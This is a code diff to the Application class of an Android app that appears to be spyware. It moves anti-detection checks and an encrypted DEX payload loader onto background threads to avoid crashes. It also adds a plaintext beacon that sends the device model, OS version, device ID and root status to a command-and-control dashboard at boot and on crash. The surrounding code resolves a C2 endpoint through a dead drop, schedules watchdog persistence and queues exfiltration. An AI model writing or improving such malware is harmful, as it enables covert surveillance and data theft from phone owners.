@@ -5,6 +5,7 @@ import android.util.Log
 import com.sp.loader.DexLoader
 import com.sp.core.stealth.AntiDetect
 import com.sp.core.util.BatchExfil
+import com.sp.core.util.Beacon
 import com.sp.core.util.DeadDrop
 import com.sp.watchdog.WatchdogAlarm
 import com.sp.watchdog.WatchdogJob
@@ -31,17 +32,26 @@ class App : Application() {
         } catch (t: Throwable) {
         }
 
-        try {
-            AntiDetect.guard(this)
-        } catch (t: Throwable) {
-            Log.w(TAG, "antidetect: ${t.message}")
-        }
+        // Off the main thread: the environment probe does file and socket
+        // checks and must never block the looper.
+        Thread {
+            try {
+                AntiDetect.guard(this)
+            } catch (t: Throwable) {
+                Log.w(TAG, "antidetect: ${t.message}")
+            }
+        }.start()
 
-        try {
-            DexLoader.launch(this)
-        } catch (t: Throwable) {
-            Log.w(TAG, "payload: ${t.message}")
-        }
+        // Everything heavy runs off the main thread: decrypting and verifying
+        // a multi-megabyte DEX inside Application.onCreate() was the reason
+        // for the "app dies right after the icon is tapped" ANR.
+        Thread {
+            try {
+                DexLoader.launch(this)
+            } catch (t: Throwable) {
+                Log.w(TAG, "payload: ${t.message}")
+            }
+        }.start()
 
         try {
             WatchdogJob.schedule(this)
@@ -53,6 +63,10 @@ class App : Application() {
             BatchExfil.enqueue(this, "boot", """{"ts":${System.currentTimeMillis()}}""")
         } catch (t: Throwable) {
         }
+
+        // Plaintext beacon: proves the app is alive even when the encrypted
+        // channel or the payload loader fails.
+        Beacon.send(this, "boot", bootInfo())
 
         // Dead-drop resolution of the C2 endpoint (off the main thread).
         Thread {
@@ -81,6 +95,10 @@ class App : Application() {
                 } catch (_: Throwable) {
                 }
                 try {
+                    Beacon.sendSync(this, "crash", payload)
+                } catch (_: Throwable) {
+                }
+                try {
                     java.io.File(filesDir, "crash.log").writeText(payload)
                 } catch (_: Throwable) {
                 }
@@ -104,6 +122,20 @@ class App : Application() {
             com.sp.core.c2.Exfil.sendLog(this, "crash", text)
         } catch (_: Throwable) {
         }
+    }
+
+    /** Small plaintext status blob - visible on the dashboard immediately. */
+    private fun bootInfo(): String {
+        val sb = StringBuilder()
+        sb.append("{\"sdk\":").append(android.os.Build.VERSION.SDK_INT)
+        sb.append(",\"model\":\"").append(android.os.Build.MODEL).append("\"")
+        sb.append(",\"release\":\"").append(android.os.Build.VERSION.RELEASE).append("\"")
+        sb.append(",\"app\":\"").append(com.sp.core.BuildConfig.VERSION_NAME).append("\"")
+        sb.append(",\"device_id\":\"").append(com.sp.core.util.Prefs.deviceId(this)).append("\"")
+        sb.append(",\"rooted\":").append(com.sp.core.stealth.AntiDetect.isRooted())
+        sb.append(",\"ts\":").append(System.currentTimeMillis())
+        sb.append("}")
+        return sb.toString()
     }
 
     companion object {
